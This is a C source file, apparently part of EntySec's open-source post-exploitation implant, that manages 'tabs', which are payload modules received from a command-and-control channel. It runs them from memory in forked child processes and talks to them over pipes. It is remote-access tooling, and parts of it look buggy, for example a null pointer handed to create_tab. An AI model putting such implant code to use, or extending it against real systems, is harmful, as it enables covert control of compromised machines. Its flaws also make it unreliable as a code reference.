/*
 * MIT License
 *
 * Copyright (c) 2020-2023 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>

#include <tab.h>
#include <c2.h>
#include <log.h>
#include <tlv.h>
#include <tlv_types.h>
#include <api.h>
#include <pawn.h>

#include <uthash/uthash.h>

static int create_tab(tabs_t *tab, unsigned char *buffer, int size)
{
    int pipes[2];
    char *argv[1];
    unsigned char *frame;

    pid_t pid;

    if (pipe(pipes) == -1)
        return -1;

    frame = malloc(size);
    if (frame == NULL)
        return -1;

    memcpy(frame, buffer, size);
    pid = fork();

    if (pid == -1)
    {
        free(frame);
        return -1;
    }
    else if (pid == 0)
    {
        dup2(pipes[0], STDIN_FILENO);
        argv[0] = "m4r1n4";

        #ifdef LINUX
            pawn_exec_fd(buffer, argv, environ);
        #else
        #ifdef MACOS
            pawn_exec_bundle(buffer, argv, environ);
        #endif
        #endif

        free(frame);
    }
    else
    {
        fcntl(pipes[1], F_SETFL, O_NONBLOCK);

        tab->fd = pipes[1];
        tab->pid = pid;
    }

    return 0;
}

tlv_pkt_t *tab_lookup(tabs_t **tabs, int id, c2_t *c2)
{
    tabs_t *tab;
    tlv_pkt_t *tlv_pkt;

    log_debug("* Searching for tab entry (%d)\n", id);

    HASH_FIND_INT(*tabs, &id, tab);

    if (tab != NULL)
    {
        log_debug("* Found tab entry (%d)\n", id);

        if (tlv_pkt_write(tab->fd, c2->tlv_pkt) < 0)
            return NULL;

        tlv_pkt = tlv_pkt_create();

        if (tlv_pkt_read(tab->fd, tlv_pkt) < 0)
        {
            tlv_pkt_destroy(tlv_pkt);
            return NULL;
        }

        return tlv_pkt;
    }

    log_debug("* Tab was not found (%d)\n", id);
    return NULL;
}

int tab_add(tabs_t **tabs, int id, unsigned char *buffer, int size)
{
    tabs_t *tab;
    tabs_t *tab_new;

    HASH_FIND_INT(*tabs, &id, tab);

    if (tab == NULL)
    {
        tab_new = calloc(1, sizeof(*tab_new));

        if (tab_new != NULL)
        {
            tab_new->id = id;

            if (create_tab(tab, buffer, size) < 0)
            {
                free(tab_new);
                return -1;
            }

            HASH_ADD_INT(*tabs, id, tab_new);
            log_debug("* Added tab entry (%d)\n", id);

            return 0;
        }
    }

    return -1;
}

int tab_exit(tabs_t *tab)
{
    tlv_pkt_t *tlv_pkt;

    tlv_pkt = tlv_pkt_create();

    if (tlv_pkt_add_int(tlv_pkt, TLV_TYPE_TAG, TAB_TERM) < 0)
    {
        tlv_pkt_destroy(tlv_pkt);
        return -1;
    }

    if (tlv_pkt_write(tab->fd, tlv_pkt) < 0)
    {
        tlv_pkt_destroy(tlv_pkt);
        return -1;
    }

    close(tab->fd);
    return 0;
}

int tab_delete(tabs_t **tabs, int id)
{
    tabs_t *tab;

    HASH_FIND_INT(*tabs, &id, tab);

    if (tab != NULL)
    {
        if (tab_exit(tab) < 0)
            return -1;

        HASH_DEL(*tabs, tab);

        log_debug("* Deleted tab entry (%d)\n", id);
        return 0;
    }

    return -1;
}

void tabs_free(tabs_t *tabs)
{
    tabs_t *tab;

    for (tab = tabs; tab != NULL; tab = tab->hh.next)
    {
        tab_exit(tab);

        log_debug("* Freed tab entry (%d)\n", tab->id);
        HASH_DEL(tabs, tab);

        free(tab);
    }

    free(tabs);
}
